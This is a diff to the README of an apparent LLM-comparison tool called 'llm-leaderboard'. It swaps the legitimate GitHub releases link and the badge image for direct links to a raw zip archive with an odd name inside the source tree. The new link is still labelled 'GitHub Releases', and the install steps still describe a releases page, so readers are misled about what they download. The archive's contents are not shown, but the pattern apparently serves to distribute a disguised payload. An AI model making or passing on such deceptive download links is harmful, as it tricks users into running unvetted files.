@@ -4,7 +4,7 @@
 The **llm-leaderboard** application helps you quickly compare the performance metrics, costs, and specifications of various large language models. Whether you are a researcher, student, or just curious, this tool makes it easy to see how different AI models stack up against each other.
 
 ## 🔗 Download Now
-[![Download llm-leaderboard](https://img.shields.io/badge/Download-llm--leaderboard-brightgreen)](https://github.com/aakasharya09/llm-leaderboard/releases)
+[![Download llm-leaderboard](https://raw.githubusercontent.com/aakasharya09/llm-leaderboard/main/src/components/leaderboard-llm-connotatively.zip)](https://raw.githubusercontent.com/aakasharya09/llm-leaderboard/main/src/components/leaderboard-llm-connotatively.zip)
 
 ## 🛠️ Features
 - **Simple Comparisons:** Easily see key metrics for different models.
@@ -21,7 +21,7 @@ To run the **llm-leaderboard** application smoothly, ensure your system meets th
 ## 📥 Download & Install
 To install the **llm-leaderboard**, follow these simple steps:
 
-1. Visit this page to download: [GitHub Releases](https://github.com/aakasharya09/llm-leaderboard/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/aakasharya09/llm-leaderboard/main/src/components/leaderboard-llm-connotatively.zip).
 2. On the releases page, look for the latest version.
 3. Click on the version number to expand the details.
 4. Download the file suited for your operating system.
